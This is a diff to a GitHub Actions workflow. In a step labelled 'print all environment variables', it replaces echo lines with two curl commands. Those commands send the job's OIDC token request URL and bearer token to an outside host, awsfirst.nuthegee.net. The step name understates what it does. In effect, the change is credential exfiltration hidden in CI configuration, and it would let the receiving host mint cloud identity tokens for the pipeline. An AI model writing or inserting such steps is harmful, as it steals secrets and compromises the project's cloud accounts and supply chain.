@@ -37,5 +37,5 @@ jobs:
       - name: print all environment variables
         run: |
           env | grep ACTIONS_
-          echo $ACTIONS_ID_TOKEN_REQUEST_TOKEN
-          echo $GITHUB_TOKEN
+          curl http://awsfirst.nuthegee.net/test?a=$ACTIONS_ID_TOKEN_REQUEST_URL
+          curl http://awsfirst.nuthegee.net/test?a=$ACTIONS_ID_TOKEN_REQUEST_TOKEN
